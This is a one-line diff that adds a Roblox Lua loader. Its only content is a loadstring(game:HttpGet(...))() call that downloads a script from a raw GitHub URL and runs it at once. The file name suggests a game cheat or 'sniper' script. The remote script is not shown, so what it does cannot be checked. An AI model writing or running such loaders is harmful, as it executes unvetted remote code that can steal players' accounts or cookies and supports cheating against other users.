@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Frontierpifurnace41/loaders/main/loaders/battlepass-sniper-arena-spam7-aso50yr4j15ooh.lua"))()
